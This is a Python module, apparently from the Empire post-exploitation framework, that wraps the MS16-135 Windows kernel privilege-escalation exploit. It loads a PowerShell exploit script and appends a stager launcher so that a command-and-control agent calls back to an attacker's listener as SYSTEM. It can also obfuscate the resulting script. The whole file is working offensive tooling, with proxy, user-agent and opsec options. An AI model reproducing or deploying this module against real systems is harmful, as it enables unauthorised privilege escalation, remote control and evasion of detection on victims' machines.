from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-MS16135',

            'Author': ['@TinySecEx', '@FuzzySec', 'ThePirateWhoSmellsOfSunflowers (github)'],

            'Description': ('Spawns a new Listener as SYSTEM by'
                            ' leveraging the MS16-135 local exploit. This exploit is for x64 only'
                            ' and only works on unlocked session.'
                            ' Note: the exploit performs fast windows switching, victim\'s desktop'
                            ' may flash. A named pipe is also created.'
                            ' Thus, opsec is not guaranteed'),
            'Background' : True,

            'OutputExtension' : None,

            'NeedsAdmin' : False,

            'OpsecSafe' : False,
            
            'Language' : 'powershell',

            'MinLanguageVersion' : '2',

            'Comments': [
                'Credit to TinySec (@TinySecEx) for the initial PoC and',
                'to Ruben Boonen (@FuzzySec) for PowerShell PoC',
                'https://github.com/tinysec/public/tree/master/CVE-2016-7255',
                'https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135',
                'https://security.googleblog.com/2016/10/disclosing-vulnerabilities-to-protect.html'
            ]
        }

        self.options = {
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        self.mainMenu = mainMenu

        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
        
        moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/Invoke-MS16135.ps1"
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        # generate the launcher code without base64 encoding
        l = self.mainMenu.stagers.stagers['multi/launcher']
        l.options['Listener']['Value'] = self.options['Listener']['Value']
        l.options['UserAgent']['Value'] = self.options['UserAgent']['Value']
        l.options['Proxy']['Value'] = self.options['Proxy']['Value']
        l.options['ProxyCreds']['Value'] = self.options['ProxyCreds']['Value']
        l.options['Base64']['Value'] = 'False'
        launcherCode = l.generate()

        # need to escape characters
        launcherCode = launcherCode.replace("`", "``").replace("$", "`$").replace("\"","'")
        
        script += 'Invoke-MS16135 -Command "' + launcherCode + '"'
        script += ';`nInvoke-MS16135 completed.'
        if obfuscate:
            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
        return script
